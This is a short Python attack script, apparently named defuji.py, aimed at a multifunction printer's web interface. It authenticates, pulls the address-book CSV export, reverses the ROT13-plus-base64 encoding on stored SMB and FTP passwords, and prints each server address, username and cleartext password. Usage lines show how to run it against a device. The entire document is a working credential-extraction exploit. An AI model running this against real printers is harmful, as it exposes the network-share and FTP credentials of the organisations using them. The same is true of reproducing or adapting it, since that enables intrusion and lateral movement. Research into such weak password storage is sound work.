import sys
import base64
import codecs
import requests
from csv import DictReader


if len(sys.argv) == 4:
	target=sys.argv[1]
	user=sys.argv[2]
	password=sys.argv[3]
	if (not(target.startswith("http"))):
		target="http://"+target
	URL=target+"/addr/cgi-bin/addrBKCSVExptProc.cgi?transFileName=SPLFILE&exportType=9"
	c = requests.Session()
	c.auth =(user, password)
	r = c.get(URL)
	if (r.status_code==200):
		csv_dict_reader = DictReader(r.text.split('\n')[1:])
		for row in csv_dict_reader:
			if ((row['MFSVRT']=="SMB") or (row['MFSVRT']=="FTP")):
				if (row['MFPASSWD']!=""):
					password=codecs.encode(row['MFPASSWD'], 'rot_13')
					password=base64.b64decode(password).decode('utf-8')
					print("SERVER ADDRESS: " +row['MFSVRADDR']+" USER: "+row['MFUSER'] + " PASSWORD: "+password)
	else: print("Failed")
else:       
	print("Usage:")
	print("defuji.py IP user pass")
	print("i.e.: defuji.py 192.168.1.100 printuser 123456")
